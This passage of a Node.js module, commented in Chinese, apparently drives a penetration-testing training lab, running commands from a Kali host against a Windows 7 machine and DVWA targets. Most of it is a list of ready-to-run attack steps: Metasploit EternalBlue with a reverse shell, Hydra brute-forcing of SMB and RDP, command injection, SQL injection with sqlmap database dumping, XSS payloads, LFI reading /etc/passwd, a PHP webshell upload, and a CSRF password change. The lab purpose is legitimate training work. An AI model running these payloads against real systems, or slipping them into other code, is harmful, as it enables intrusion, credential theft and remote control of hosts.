  const url = dvwa.baseUrl.endsWith('/') ? dvwa.baseUrl : `${dvwa.baseUrl}/`;
  const loginUrl = `${url}${dvwa.loginPage}`;
  const setupUrl = `${url}${dvwa.setupPage}`;

  try {
    // 先访问登录页抓 HTTP 状态 + 页面特征
    const loginCmd =
      `set +e; ` +
      `echo "===HEAD_LOGIN==="; curl -sSk -o /dev/null -w "HTTP_CODE:%{http_code}\\nREDIRECT:%{redirect_url}\\nSIZE:%{size_download}\\nTIME:%{time_total}s\\n" --max-time 8 "${loginUrl}"; ` +
      `echo "===BODY_SNIPPET==="; curl -sSk --max-time 8 "${loginUrl}" | head -c 1500; echo; ` +
      `echo "===SETUP_CHECK==="; curl -sSk -o /dev/null -w "HTTP_CODE:%{http_code}\\n" --max-time 8 "${setupUrl}"`;
    const res = await execOnKali(loginCmd, 20_000);
    const text = res.stdout || '';
    const m = text.match(/HTTP_CODE:(\d+)/);
    const httpCode = m ? Number(m[1]) : 0;
    const body = text.split('===BODY_SNIPPET===')[1] || '';
    const hasDvwaSign =
      /DVWA/i.test(body) ||
      /Damn Vulnerable Web Application/i.test(body) ||
      /dvwa_page/i.test(body) ||
      /Login\.php/i.test(body) ||
      /username.*password/i.test(body);
    const setupM = (text.split('===SETUP_CHECK===')[1] || '').match(/HTTP_CODE:(\d+)/);
    const setupCode = setupM ? Number(setupM[1]) : 0;
    const requiresSetup = setupCode === 200 && /setup/i.test(body);
    const latencyMs = Date.now() - start;

    return {
      ...dvwa,
      online: httpCode === 200 || httpCode === 302,
      latencyMs,
      httpCode,
      setupCode,
      loginUrl,
      setupUrl,
      requiresSetup,
      looksLikeDvwa: hasDvwaSign,
      bodySnippet: body.slice(0, 1500),
      error: null,
    };
  } catch (e) {
    return {
      ...dvwa,
      online: false,
      latencyMs: Date.now() - start,
      httpCode: 0,
      setupCode: 0,
      loginUrl,
      setupUrl,
      requiresSetup: false,
      looksLikeDvwa: false,
      bodySnippet: '',
      error: e.message,
    };
  }
}

// 一次性返回所有 DVWA 状态
async function getAllDvwaStatuses() {
  const list = await Promise.all(DVWA_TARGETS.map((d) => checkDvwaOnline(d)));
  return { generatedAt: new Date().toISOString(), dvwaTargets: list };
}

// ===== 通用 Web 靶场健康检查（从 Kali 发起 curl 检查）=====
// 支持: status=ready 做真实 HTTP 探测；status=planned 返回占位信息不探测
async function checkWebTargetOnline(target) {
  const start = Date.now();
  const baseUrl = target.baseUrl || '';

  // 规划中的靶场（planned / building）：不真实探测，直接返回元数据
  if (target.status === 'planned' || target.status === 'building') {
    return {
      ...target,
      online: false,
      latencyMs: null,
      httpCode: null,
      bodySnippet: '',
      signaturesMatched: [],
      verified: false,
      error: null,
      checkNote: target.plannedNotice || '尚未搭建，预计很快上线',
    };
  }

  // 构造检查 URL：优先 target.checkPath，否则用 baseUrl
  const checkUrl = (() => {
    if (!baseUrl) return '';
    const normalized = baseUrl.endsWith('/') ? baseUrl.slice(0, -1) : baseUrl;
    if (target.checkPath && target.checkPath.length > 0) {
      return target.checkPath.startsWith('http')
        ? target.checkPath
        : `${normalized}/${target.checkPath}`;
    }
    return `${normalized}/`;
  })();

  try {
    if (!checkUrl) {
      return {
        ...target,
        online: false,
        latencyMs: Date.now() - start,
        httpCode: 0,
        signaturesMatched: [],
        verified: false,
        error: '未配置 baseUrl',
      };
    }

    const cmd =
      `set +e; ` +
      `echo "===HTTP_INFO==="; curl -sSk -o /dev/null -w "HTTP_CODE:%{http_code}\\nREDIRECT:%{redirect_url}\\nSIZE:%{size_download}\\nTIME:%{time_total}s\\n" --max-time 10 "${checkUrl}"; ` +
      `echo "===BODY_SNIPPET==="; curl -sSk --max-time 10 "${checkUrl}" | head -c 3000; echo`;
    const res = await execOnKali(cmd, 25_000);
    const text = res.stdout || '';

    const m = text.match(/HTTP_CODE:(\d+)/);
    const httpCode = m ? Number(m[1]) : 0;
    const body = text.split('===BODY_SNIPPET===')[1] || '';

    // 匹配签名
    const signaturesMatched = [];
    const sigs = target.signatures || [];
    for (const sig of sigs) {
      if (sig && body && body.includes(sig)) signaturesMatched.push(sig);
    }

    const ok = httpCode === 200 || httpCode === 302 || httpCode === 301 || httpCode === 401 || httpCode === 403;
    const verified = ok && (signaturesMatched.length > 0 || sigs.length === 0 || httpCode === 401 || httpCode === 403);

    return {
      ...target,
      online: ok,
      latencyMs: Date.now() - start,
      httpCode,
      bodySnippet: body.slice(0, 1500),
      signaturesMatched,
      verified,
      error: null,
    };
  } catch (e) {
    return {
      ...target,
      online: false,
      latencyMs: Date.now() - start,
      httpCode: 0,
      bodySnippet: '',
      signaturesMatched: [],
      verified: false,
      error: e.message,
    };
  }
}

// 一次性返回所有 Web 靶场（含 ready 和 planned）的状态
async function getAllWebTargetsStatuses({ includePlanned = true } = {}) {
  const list = includePlanned ? WEB_TARGETS : WEB_TARGETS.filter((t) => t.status === 'ready');
  const results = await Promise.all(list.map((t) => checkWebTargetOnline(t)));
  const readyList = results.filter((t) => t.status === 'ready');
  const plannedList = results.filter((t) => t.status === 'planned' || t.status === 'building');
  const onlineCount = readyList.filter((t) => t.online).length;

  // 按类别分组
  const byCategory = {};
  for (const cat of WEB_TARGET_CATEGORIES) {
    byCategory[cat.key] = results.filter((t) => t.category === cat.key);
  }

  return {
    generatedAt: new Date().toISOString(),
    totalCount: results.length,
    readyCount: readyList.length,
    plannedCount: plannedList.length,
    onlineCount,
    categories: WEB_TARGET_CATEGORIES,
    byCategory,
    targets: results,
    readyTargets: readyList,
    plannedTargets: plannedList,
  };
}

// ===== 攻击模块定义（给前端提供攻击向导）=====
const ATTACK_MODULES = [
  {
    id: 'recon',
    name: '信息收集',
    icon: '🔍',
    color: 'cyan',
    steps: [
      {
        id: 'nmap-quick',
        name: '快速端口扫描',
        description: '扫描靶机 Top 1000 端口，识别开放服务',
        command: `nmap -Pn -n -sV --version-intensity 5 -T4 ${WIN7_CONFIG.host}`,
        timeout: 120_000,
      },
      {
        id: 'nmap-full',
        name: '全端口扫描',
        description: '扫描全部 65535 个 TCP 端口（需要较长时间）',
        command: `nmap -Pn -n -p- --min-rate 3000 -T4 ${WIN7_CONFIG.host}`,
        timeout: 300_000,
      },
      {
        id: 'nmap-vuln',
        name: '漏洞脚本扫描',
        description: '使用 Nmap NSE vuln 脚本族扫描常见漏洞',
        command: `nmap -Pn -n --script=vuln,smb-vuln-*,rdp-vuln-ms12-020 -T4 ${WIN7_CONFIG.host}`,
        timeout: 180_000,
      },
      {
        id: 'nmap-os',
        name: '操作系统探测',
        description: '使用 Nmap 指纹识别目标 OS 版本',
        command: `sudo -n nmap -Pn -n -O --osscan-guess -T4 ${WIN7_CONFIG.host} 2>/dev/null || nmap -Pn -n -sV -T4 ${WIN7_CONFIG.host}`,
        timeout: 120_000,
      },
    ],
  },
  {
    id: 'smb',
    name: 'SMB 扫描与利用',
    icon: '🖥️',
    color: 'indigo',
    steps: [
      {
        id: 'enum4linux',
        name: 'SMB 信息枚举 (enum4linux)',
        description: '枚举用户名、共享、组、密码策略',
        command: `which enum4linux-ng >/dev/null 2>&1 && enum4linux-ng -A ${WIN7_CONFIG.host} || enum4linux -a ${WIN7_CONFIG.host} 2>&1 | head -150`,
        timeout: 120_000,
      },
      {
        id: 'smbclient-list',
        name: 'smbclient 列出共享',
        description: '匿名列出靶机上的 SMB 共享文件夹',
        command: `smbclient -L \\\\${WIN7_CONFIG.host}\\ -N -I ${WIN7_CONFIG.host} 2>&1 || smbclient -L //${WIN7_CONFIG.host}/ -N 2>&1`,
        timeout: 30_000,
      },
      {
        id: 'smbmap',
        name: 'smbmap 共享权限',
        description: '检查每个共享的读/写权限',
        command: `smbmap -H ${WIN7_CONFIG.host} 2>&1 | head -60`,
        timeout: 30_000,
      },
      {
        id: 'smb-vuln-ms17-010',
        name: '永恒蓝 MS17-010 检测',
        description: '用 Nmap 脚本扫描永恒蓝漏洞',
        command: `nmap -Pn -n -p 445 --script smb-vuln-ms17-010 ${WIN7_CONFIG.host}`,
        timeout: 30_000,
      },
    ],
  },
  {
    id: 'exploit',
    name: '漏洞利用（MSF）',
    icon: '💣',
    color: 'rose',
    steps: [
      {
        id: 'msf-ms17-010-scan',
        name: 'MSF: MS17-010 辅助扫描',
        description: '用 Metasploit auxiliary 模块确认永恒蓝',
        command: `msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ${WIN7_CONFIG.host}; run; exit" 2>&1 | tail -60`,
        timeout: 120_000,
      },
      {
        id: 'msf-ms08-067',
        name: 'MSF: MS08-067 检测',
        description: '经典 Windows SMB 远程代码执行漏洞检测',
        command: `msfconsole -q -x "use auxiliary/scanner/smb/smb_ms08_067; set RHOSTS ${WIN7_CONFIG.host}; run; exit" 2>&1 | tail -60`,
        timeout: 60_000,
      },
      {
        id: 'msf-bluekeep-check',
        name: 'MSF: BlueKeep (CVE-2019-0708) 检测',
        description: 'RDP 远程代码执行漏洞（需要 3389 开放）',
        command: `msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS ${WIN7_CONFIG.host}; run; exit" 2>&1 | tail -60`,
        timeout: 60_000,
      },
      {
        id: 'msf-eternalblue-exploit',
        name: 'MSF: 永恒蓝 exploit（有风险）',
        description: '⚠️ 执行永恒蓝攻击，payload=reverse_tcp(LHOST=Kali)。真实靶机慎用，可能蓝屏/崩溃。',
        dangerous: true,
        command: `echo "[Warn] 这个步骤会真正攻击靶机，可能导致 Win7 蓝屏，请在前端手动确认。可使用："; echo "use exploit/windows/smb/ms17_010_eternalblue"; echo "set RHOSTS ${WIN7_CONFIG.host}"; echo "set LHOST ${KALI_CONFIG.host}"; echo "exploit"`,
        timeout: 10_000,
      },
    ],
  },
  {
    id: 'brute',
    name: '密码爆破',
    icon: '🔑',
    color: 'amber',
    steps: [
      {
        id: 'hydra-smb',
        name: 'Hydra SMB 爆破',
        description: '用常见弱口令字典爆破 SMB 登录',
        command: `DICT=/usr/share/wordlists/metasploit/password.lst; [ -f "$DICT" ] || DICT=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt; [ -f "$DICT" ] || { mkdir -p /tmp/cisp; printf "admin\\n123456\\npassword\\n12345678\\nqwerty\\n123\\nletmein\\nadministrator\\nkail\\nroot\\n" > /tmp/cisp/pass.txt; DICT=/tmp/cisp/pass.txt; }; USERLIST=/tmp/cisp/users.txt; printf "administrator\\nadmin\\nuser\\nguest\\nkail\\n" > $USERLIST; echo "[*] 爆破SMB 用户列表: $(cat $USERLIST | wc -l) 个, 密码数: $(wc -l < $DICT)"; hydra -L $USERLIST -P $DICT -t 4 -f smb://${WIN7_CONFIG.host} 2>&1 | tail -40`,
        timeout: 180_000,
      },
      {
        id: 'hydra-rdp',
        name: 'Hydra RDP 爆破',
        description: '爆破 3389 RDP 登录（注意：多次失败会触发锁定）',
        command: `USERLIST=/tmp/cisp/users.txt; [ -f $USERLIST ] || printf "administrator\\nadmin\\nuser\\n" > $USERLIST; DICT=/tmp/cisp/pass.txt; [ -f $DICT ] || printf "123456\\npassword\\n\\nadmin\\n" > $DICT; hydra -L $USERLIST -P $DICT -t 2 -W 5 rdp://${WIN7_CONFIG.host} 2>&1 | tail -40`,
        timeout: 120_000,
      },
      {
        id: 'crackmapexec-smb',
        name: 'CrackMapExec SMB 爆破',
        description: '更高效的 SMB 登录验证（如果已安装）',
        command: `which cme >/dev/null 2>&1 && cme smb ${WIN7_CONFIG.host} -u administrator -p '' --local-auth 2>&1 || echo "crackmapexec 未安装，可运行: sudo apt install crackmapexec"`,
        timeout: 30_000,
      },
    ],
  },
  {
    id: 'postex',
    name: '后渗透信息收集',
    icon: '🧭',
    color: 'emerald',
    steps: [
      {
        id: 'gobuster-http',
        name: 'Gobuster 目录爆破',
        description: '如果 80 端口开启，暴力枚举 Web 目录',
        command: `WL=/usr/share/wordlists/dirb/common.txt; [ -f "$WL" ] || WL=/usr/share/dirb/wordlists/common.txt; [ -f "$WL" ] || WL=/usr/share/seclists/Discovery/Web-Content/common.txt; if [ -f "$WL" ]; then gobuster dir -u http://${WIN7_CONFIG.host}/ -w "$WL" -t 20 -q 2>&1 | head -80; else echo "[-] 目录字典未找到, 请先安装 seclists / dirb"; fi`,
        timeout: 120_000,
      },
      {
        id: 'nikto',
        name: 'Nikto Web 扫描器',
        description: '针对 HTTP 服务的漏洞扫描',
        command: `timeout 90 nikto -host http://${WIN7_CONFIG.host}/ -maxtime 80s 2>&1 | tail -60 || echo "[*] nikto 未安装或无HTTP服务可用"`,
        timeout: 120_000,
      },
      {
        id: 'netdiscover-local',
        name: '内网存活主机发现',
        description: '在 Kali 所在网段做 ARP 扫描找其他靶机',
        command: `sudo -n netdiscover -r ${WIN7_CONFIG.host}/24 -P -N -c 2 2>/dev/null | head -40 || (apt list --installed 2>/dev/null | grep -q netdiscover && netdiscover -r ${WIN7_CONFIG.host}/24 -P -N -c 2 | head -40) || nmap -sn -T4 ${WIN7_CONFIG.host}/24 2>&1 | tail -30`,
        timeout: 60_000,
      },
      {
        id: 'cme-smb-shares',
        name: 'CME 检查空会话 SMB',
        description: '检查 SMB 空口令/匿名登录枚举共享',
        command: `which cme >/dev/null 2>&1 && cme smb ${WIN7_CONFIG.host} -u '' -p '' --shares 2>&1 || which crackmapexec >/dev/null 2>&1 && crackmapexec smb ${WIN7_CONFIG.host} -u '' -p '' --shares 2>&1 || echo "[*] 使用 smbclient 替代:"; smbclient -L \\\\${WIN7_CONFIG.host}\\ -N -I ${WIN7_CONFIG.host} 2>&1 | head -30`,
        timeout: 30_000,
      },
    ],
  },
  {
    id: 'dvwa',
    name: 'DVWA Web 漏洞专项',
    icon: '🎯',
    color: 'violet',
    targets: ['dvwa-kali', 'dvwa-win7'],
    steps: [
      {
        id: 'dvwa-health',
        name: 'DVWA 健康检查（curl）',
        description: '检查 DVWA 登录页和 Setup 页是否可访问',
        command:
          `set +e; for U in "${DVWA_TARGETS[0].baseUrl}login.php" "${DVWA_TARGETS[1].baseUrl}login.php"; do ` +
          `echo ">>>>>>>>>>>>>>> $U"; ` +
          `curl -sSk -o /dev/null -w "HTTP_CODE:%{http_code}  TIME:%{time_total}s  SIZE:%{size_download}\\n" --max-time 8 "$U"; ` +
          `curl -sSk --max-time 8 "$U" | grep -iE "dvwa|Damn Vulnerable" | head -2; ` +
          `done`,
        timeout: 25_000,
      },
      {
        id: 'dvwa-brute',
        name: '暴力破解 Brute Force',
        description: '针对 DVWA brute.php 做 Hydra http-get-form 爆破（默认账密 admin/password）',
        command:
          `WL=/usr/share/wordlists/metasploit/password.lst; [ -f "$WL" ] || WL=/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt; [ -f "$WL" ] || { mkdir -p /tmp/cisp; printf "password\\n123456\\nadmin\\n12345678\\npass\\nqwerty\\n" > /tmp/cisp/pass.txt; WL=/tmp/cisp/pass.txt; }; ` +
          `TARGET="${DVWA_TARGETS[0].baseUrl}vulnerabilities/brute/"; ` +
          `echo "[*] 目标: $TARGET"; ` +
          `echo "[*] Hydra GET-FORM 爆破 admin 用户...（小字典，限制 6 秒）"; ` +
          `(which hydra >/dev/null 2>&1 && timeout 30 hydra -l admin -P "$WL" -s 80 "${DVWA_TARGETS[0].machine === 'kali' ? 192 : 1}http-get-form" -t 2 "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:" 2>&1 | tail -30) || ` +
          `(echo "[*] 改用 curl 快速验证默认账号..."; ` +
          `for U in admin root test; do ` +
          `R=$(curl -sSk --max-time 5 -b "PHPSESSID=dvwatest" "$TARGET?username=$U&password=password&Login=Login"); ` +
          `if echo "$R" | grep -qi "Welcome to the password protected area"; then echo "[+] 成功: $U / password"; fi; ` +
          `done)`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-cmdinj',
        name: '命令注入 Command Injection',
        description: '对 ping 功能注入 && / ; 拼接命令 RCE',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== 测试 $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `# 1) 取 PHPSESSID + CSRF 并模拟登录(默认 admin/password)` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `# 2) 切到 low 安全级别` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `# 3) 命令注入 payload: 127.0.0.1 ; id; uname -a` +
          `PAYLOAD='127.0.0.1 ; id; uname -a; pwd; whoami'; ` +
          `echo "[*] 注入 payload -> $PAYLOAD"; ` +
          `ENCODED=$(which python3 >/dev/null 2>&1 && python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD" || echo "$PAYLOAD" | sed 's/ /%20/g;s/;/%3B/g'); ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/exec/?ip=$ENCODED&Submit=Submit" 2>&1 | grep -vE "^<|^\\s*$" | tail -30; ` +
          `done`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-sqli',
        name: 'SQL 注入 SQL Injection',
        description: '在 id 参数上做单引号测试 + UNION SELECT 注入',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `echo "[1] 单引号测试 (id=1'):"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/sqli/?id=1%27&Submit=Submit" 2>&1 | grep -iE "error|mysql|syntax|warning" | head -10; ` +
          `echo "[2] UNION SELECT 查版本与用户:"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/sqli/?id='+UNION+SELECT+1,concat('version=',version(),'---user=',current_user(),'---db=',database())--+-&Submit=Submit" 2>&1 | grep -oE "version=[^<]+" | head -3; ` +
          `echo "[3] 枚举表名:"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/sqli/?id='+UNION+SELECT+1,table_name+FROM+information_schema.tables+WHERE+table_schema=database()--+-&Submit=Submit" 2>&1 | grep -oE '<pre>.*</pre>' | head -3; ` +
          `done`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-sqlmap',
        name: 'Sqlmap 全自动 SQLi 注入',
        description: '用 sqlmap 对 DVWA sqli 端点做自动注入 + 拖库',
        command:
          `DVWA="${DVWA_TARGETS[0].baseUrl}"; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `COOKIE_STRING=$(cat $COOKIES | awk 'NR>3 {print $6"="$7}' ORS='; ' | sed 's/; $//'); ` +
          `echo "[*] Cookie: $COOKIE_STRING"; ` +
          `URL="\${DVWA}vulnerabilities/sqli/?id=1&Submit=Submit"; ` +
          `which sqlmap >/dev/null 2>&1 || { echo "[-] sqlmap 未安装，可运行: sudo apt install sqlmap"; exit 1; }; ` +
          `timeout 120 sqlmap -u "$URL" --cookie="$COOKIE_STRING" --batch --answers="crack=N,dump=Y" --dbs --dbms=mysql --level=2 --risk=2 --threads=4 2>&1 | tail -80`,
        timeout: 180_000,
      },
      {
        id: 'dvwa-xss',
        name: 'XSS 注入（反射 + 存储）',
        description: '注入脚本弹框 payload，检查反射型/存储型 XSS 是否被过滤',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `PAYLOAD='<script>alert("XSS-CISP")</script>'; ` +
          `ENC_PAYLOAD=$(which python3 >/dev/null 2>&1 && python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$PAYLOAD" || printf '%s' "$PAYLOAD" | sed 's/</%3C/g;s/>/%3E/g;s/"/%22/g;s/ /%20/g'); ` +
          `echo "[1] Reflected XSS (name 参数):"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/xss_r/?name=$ENC_PAYLOAD" 2>&1 | grep -oE 'alert\\("XSS-CISP"\\)' | head -3; ` +
          `echo "[2] Stored XSS (Guestbook):"; ` +
          `curl -sSk -b $COOKIES -X POST --data-urlencode "txtName=CISP" --data-urlencode "mtxMessage=$PAYLOAD" -d "btnSign=Sign+Guestbook" "\${DVWA}vulnerabilities/xss_s/" 2>&1 > /dev/null; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/xss_s/" 2>&1 | grep -oE 'alert\\("XSS-CISP"\\)' | head -3; ` +
          `done`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-fileinc',
        name: '文件包含 LFI / RFI',
        description: 'page 参数本地文件包含 /etc/passwd 与 apache 日志 RFI 测试',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `echo "[1] LFI ../../../../../etc/passwd:"; ` +
          `LFI=$(curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/fi/?page=../../../../../etc/passwd" 2>&1); ` +
          `echo "$LFI" | grep -E "^(root|daemon|www-data|admin):" | head -8 || { ` +
          `echo "[1b] 尝试 Windows LFI:"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/fi/?page=../../../../../windows/win.ini" 2>&1 | grep -iE "\\[fonts\\]|extensions|MAPI" | head -5; ` +
          `}; ` +
          `echo "[2] PHP 封装器 php://filter 读 source:"; ` +
          `curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=include.php" 2>&1 | grep -oE '[A-Za-z0-9+/=]{40,}' | head -1; ` +
          `done`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-upload',
        name: '文件上传漏洞（上传 WebShell）',
        description: '上传 .php 脚本一句话木马并检查是否被执行',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `SHELL=/tmp/cisp_shell.php; ` +
          `echo '<?php echo "CISP-OK:".php_uname()."\n"; @system($_GET["c"]); ?>' > $SHELL; ` +
          `echo "[*] 上传 $SHELL ..."; ` +
          `UP=$(curl -sSk -b $COOKIES -F "MAX_FILE_SIZE=100000" -F "uploaded=@$SHELL;type=image/png" -F "Upload=Upload" "\${DVWA}vulnerabilities/upload/" 2>&1); ` +
          `echo "$UP" | grep -iE "uploaded|success|hackable" | head -5; ` +
          `BASE=$(echo "$DVWA" | sed -E 's#^(https?://[^/]+)/.*$#\\1#'); ` +
          `SHELL_URL="$BASE/dvwa/hackable/uploads/cisp_shell.php"; ` +
          `echo "[*] 检查 WebShell: $SHELL_URL"; ` +
          `curl -sSk --max-time 5 "$SHELL_URL?c=id" 2>&1 | head -5; ` +
          `done`,
        timeout: 60_000,
      },
      {
        id: 'dvwa-csrf',
        name: 'CSRF 改密检测',
        description: '检测密码修改端点是否存在 CSRF（无 token 且仅 GET 即可改密）',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `COOKIES=/tmp/dvwa.cookies; ` +
          `curl -sSk -c $COOKIES -o /dev/null "\${DVWA}login.php"; ` +
          `CSRF=$(curl -sSk -b $COOKIES "\${DVWA}login.php" | grep -oP 'name="user_token" value="\\K[^"]+' | head -1); ` +
          `curl -sSk -b $COOKIES -c $COOKIES -X POST -d "username=admin&password=password&Login=Login&user_token=\${CSRF:-0}" -o /dev/null "\${DVWA}login.php" 2>&1; ` +
          `curl -sSk -b $COOKIES -X POST -d "security=low&seclev_submit=Submit" -o /dev/null "\${DVWA}security.php" 2>&1; ` +
          `echo "[*] CSRF 改密尝试 -> password_new"; ` +
          `R=$(curl -sSk -b $COOKIES "\${DVWA}vulnerabilities/csrf/?password_current=password&password_new=Cisp@2026&password_conf=Cisp@2026&Change=Change" 2>&1); ` +
          `echo "$R" | grep -iE "password.*change|changed|error" | head -5; ` +
          `done`,
        timeout: 40_000,
      },
      {
        id: 'dvwa-nikto-scan',
        name: 'Nikto 扫 DVWA 站点',
        description: 'Nikto 对 DVWA 端点做综合配置/漏洞扫描',
        command:
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `which nikto >/dev/null 2>&1 || { echo "[-] nikto 未安装，可运行: sudo apt install nikto"; continue; }; ` +
          `timeout 120 nikto -host "$DVWA" -maxtime 100s -nointeractive 2>&1 | tail -60; ` +
          `done`,
        timeout: 180_000,
      },
      {
        id: 'dvwa-gobuster',
        name: 'Gobuster 目录爆破 DVWA',
        description: '对 DVWA 根路径做目录枚举，找未授权页面',
        command:
          `WL=/usr/share/wordlists/dirb/common.txt; [ -f "$WL" ] || WL=/usr/share/dirb/wordlists/common.txt; [ -f "$WL" ] || WL=/usr/share/seclists/Discovery/Web-Content/common.txt; ` +
          `for DVWA in "${DVWA_TARGETS[0].baseUrl}" "${DVWA_TARGETS[1].baseUrl}"; do ` +
          `echo "========== $DVWA =========="; ` +
          `if [ -f "$WL" ]; then timeout 90 gobuster dir -u "$DVWA" -w "$WL" -t 20 -q -x php,html 2>&1 | head -80; ` +
          `else echo "[-] 字典未找到"; fi; ` +
          `done`,
        timeout: 180_000,
      },
    ],
  },
];

// 数据目录：保存历史执行记录
const DATA_DIR = path.join(__dirname, '..', 'data');
const HISTORY_FILE = path.join(DATA_DIR, 'vmLabs-history.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(HISTORY_FILE)) fs.writeFileSync(HISTORY_FILE, '[]', 'utf8');

function readHistory() {
  try {
    return JSON.parse(fs.readFileSync(HISTORY_FILE, 'utf8'));
  } catch (_) {
    return [];
  }
}

function appendHistory(entry) {
  const list = readHistory();
  list.unshift(entry);
  const trimmed = list.slice(0, 500);
  fs.writeFileSync(HISTORY_FILE, JSON.stringify(trimmed, null, 2), 'utf8');
  return entry;
}

module.exports = {
  KALI_CONFIG,
  WIN7_CONFIG,
  MACHINES,
  DVWA_TARGETS,
  WEB_TARGETS,
  WEB_TARGET_CATEGORIES,
  ATTACK_MODULES,
  connectKali,
  closeSshClient,
  closeAllSsh,
  execOnKali,
  getAllStatuses,
  checkKaliOnline,
  checkWin7Online,
  checkDvwaOnline,
  getAllDvwaStatuses,
  checkWebTargetOnline,
  getAllWebTargetsStatuses,
  readHistory,
  appendHistory,
};
